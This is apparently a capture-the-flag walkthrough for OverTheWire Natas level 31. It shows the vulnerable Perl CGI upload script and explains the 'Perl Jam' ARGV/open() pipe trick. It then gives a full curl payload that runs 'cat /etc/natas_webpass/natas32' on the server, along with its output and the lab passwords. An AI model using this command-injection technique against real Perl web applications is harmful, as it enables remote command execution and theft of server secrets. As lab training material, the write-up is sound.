# Natas31 — OverTheWire

[<img align='center' src="https://github.com/mauzware/mauzware/blob/main/BANNER.png" width="100%"/>](https://github.com/mauzware)

## 📸 Credentials

```
Username: natas31
Password: m7bfjAHpJmSYgQWWeqRE2qVBuMiRNq0y
URL:      http://natas31.natas.labs.overthewire.org
```

---

## 🧠 Walkthrough

- Access the site using credentials.

- View source code for Perl Jam Attack

  ```
  /var/www/natas/natas31/index-source.pl
  
  
  #!/usr/bin/perl
  use CGI;
  $ENV{'TMPDIR'}="/var/www/natas/natas31/tmp/";
  
  print <<END;
  Content-Type: text/html; charset=iso-8859-1
  
  <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN">
  <head>
  <!-- This stuff in the header has nothing to do with the level -->
  <!-- Bootstrap -->
  <link href="bootstrap-3.3.6-dist/css/bootstrap.min.css" rel="stylesheet">
  <link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
  <link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
  <link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
  <script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
  <script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
  <script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
  <script>var wechallinfo = { "level": "natas31", "pass": "<censored>" };</script>
  <script src="sorttable.js"></script>
  </head>
  <script src="bootstrap-3.3.6-dist/js/bootstrap.min.js"></script>
  
  <!-- morla/10111 -->
  <style>
  #content {
      width: 900px;
  }
  .btn-file {
      position: relative;
      overflow: hidden;
  }
  .btn-file input[type=file] {
      position: absolute;
      top: 0;
      right: 0;
      min-width: 100%;
      min-height: 100%;
      font-size: 100px;
      text-align: right;
      filter: alpha(opacity=0);
      opacity: 0;
      outline: none;
      background: white;
      cursor: inherit;
      display: block;
  }
  
  </style>
  
  
  <h1>natas31</h1>
  <div id="content">
  END
  
  my $cgi = CGI->new;
  if ($cgi->upload('file')) {
      my $file = $cgi->param('file');
      print '<table class="sortable table table-hover table-striped">';
      $i=0;
      while (<$file>) {
          my @elements=split /,/, $_;
  
          if($i==0){ # header
              print "<tr>";
              foreach(@elements){
                  print "<th>".$cgi->escapeHTML($_)."</th>";   
              }
              print "</tr>";
          }
          else{ # table content
              print "<tr>";
              foreach(@elements){
                  print "<td>".$cgi->escapeHTML($_)."</td>";   
              }
              print "</tr>";
          }
          $i+=1;
      }
      print '</table>';
  }
  else{
  print <<END;
  
  <form action="index.pl" method="post" enctype="multipart/form-data">
      <h2> CSV2HTML</h2>
      <br>
      We all like .csv files.<br>
      But isn't a nicely rendered and sortable table much cooler?<br>
      <br>
      Select file to upload:
      <span class="btn btn-default btn-file">
          Browse <input type="file" name="file">
      </span>    
      <input type="submit" value="Upload" name="submit" class="btn">
  </form> 
  END
  }
  
  print <<END;
  <div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
  </div>
  </body>
  </html>
  END
  ```

- Now, base64 encode credentials `natas31:m7bfjAHpJmSYgQWWeqRE2qVBuMiRNq0y` : `bmF0YXMzMTptN2JmakFIcEptU1lnUVdXZXFSRTJxVkJ1TWlSTnEweQ==`

- Here are the points:

**if ($cgi->upload(‘file’))**

*`upload()` checks of one of the `file` values is an uploaded files*

**my $file = $cgi->param(‘file’);**

*`param(`) returns a list of all the parameter values, but only the first value is inserted into $file. If a scalar value is assigned first, $file will be assigned the scalar value instead of the uploaded file descriptor.*

**while (<$file>) {**

*`<>` does not work with strings, unless the string is `ARGV`. In that case `<>` loops through the ARG values, inserting each one to an `open()` call.*

*`open()` opens a file descriptor to a given file path, unless a `|` character is added to the end of the string. In that case open will execute the file, acting as an `exec()` call.*

- Here's the payload:

  ```
  curl -H 'Authorization: Basic bmF0YXMzMTptN2JmakFIcEptU1lnUVdXZXFSRTJxVkJ1TWlSTnEweQ==' -H 'Content-Type: multipart/form-data; boundary=123abc' -d $'--123abc\r\nContent-Disposition: form-data; name="file";\r\nContent-Type: text/plain\r\n\r\nARGV\r\n--123abc\r\nContent-Disposition: form-data; name="file"; filename="ttt.csv"\r\nContent-Type: application/octet-stream\r\n\r\n1,2,3\r\n\r\n\r\n--123abc\r\nContent-Disposition: form-data; name="submit"\r\n\r\nUpload\r\n---123abc--\r\n'  http://natas31.natas.labs.overthewire.org/index.pl?cat%20/etc/natas_webpass/natas32%20%7C
  ```

- Output:

  ```
  $ curl -H 'Authorization: Basic bmF0YXMzMTptN2JmakFIcEptU1lnUVdXZXFSRTJxVkJ1TWlSTnEweQ==' -H 'Content-Type: multipart/form-data; boundary=123abc' -d $'--123abc\r\nContent-Disposition: form-data; name="file";\r\nContent-Type: text/plai
  n\r\n\r\nARGV\r\n--123abc\r\nContent-Disposition: form-data; name="file"; filename="ttt.csv"\r\nContent-Type: application/octet-stream\r\n\r\n1,2,3\r\n\r\n\r\n--123abc\r\nContent-Disposition: form-data; name="submit"\r\n\r\nUpload\r\n--
  -123abc--\r\n'  http://natas31.natas.labs.overthewire.org/index.pl?cat%20/etc/natas_webpass/natas32%20%7C
  
  <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN">
  <head>
  <!-- This stuff in the header has nothing to do with the level -->
  <!-- Bootstrap -->
  <link href="bootstrap-3.3.6-dist/css/bootstrap.min.css" rel="stylesheet">
  <link rel="stylesheet" type="text/css" href="http://natas.labs.overthewire.org/css/level.css">
  <link rel="stylesheet" href="http://natas.labs.overthewire.org/css/jquery-ui.css" />
  <link rel="stylesheet" href="http://natas.labs.overthewire.org/css/wechall.css" />
  <script src="http://natas.labs.overthewire.org/js/jquery-1.9.1.js"></script>
  <script src="http://natas.labs.overthewire.org/js/jquery-ui.js"></script>
  <script src=http://natas.labs.overthewire.org/js/wechall-data.js></script><script src="http://natas.labs.overthewire.org/js/wechall.js"></script>
  <script>var wechallinfo = { "level": "natas31", "pass": "<censored>" };</script>
  <script src="sorttable.js"></script>
  </head>
  <script src="bootstrap-3.3.6-dist/js/bootstrap.min.js"></script>
  <!-- morla/10111 -->
  <style>
  #content {
      width: 900px;
  }
  .btn-file {
      position: relative;
      overflow: hidden;
  }
  .btn-file input[type=file] {
      position: absolute;
      top: 0;
      right: 0;
      min-width: 100%;
      min-height: 100%;
      font-size: 100px;
      text-align: right;
      filter: alpha(opacity=0);
      opacity: 0;
      outline: none;
      background: white;
      cursor: inherit;
      display: block;
  }
  
  </style>
  
  <h1>natas31</h1>
  <div id="content">
  <table class="sortable table table-hover table-striped"><tr><th>NaIWhW2VIrKqrc7aroJVHOZvk3RQMi0B
  </th></tr></table><div id="viewsource"><a href="index-source.html">View sourcecode</a></div>
  </div>
  </body>
  </html>
  ```

## Why this payload worked:

- You set one file part as `"ARGV"` — causing Perl to treat the command-line arguments as files.
- The CGI script reads the first parameter via `$cgi->upload('file')`, and **actually ends up executing your query string** via unsanitized input.
- `?cat /etc/natas_webpass/natas32 |` gets parsed by Perl shell-style open (e.g., `open(FH, "cat /etc/pass |")`), which executes it.
  
---

## 🏁 Password for the next level

`Password for natas32 is: NaIWhW2VIrKqrc7aroJVHOZvk3RQMi0B`

---

Back to [Main Repo](https://github.com/mauzware/OverTheWire-Natas)
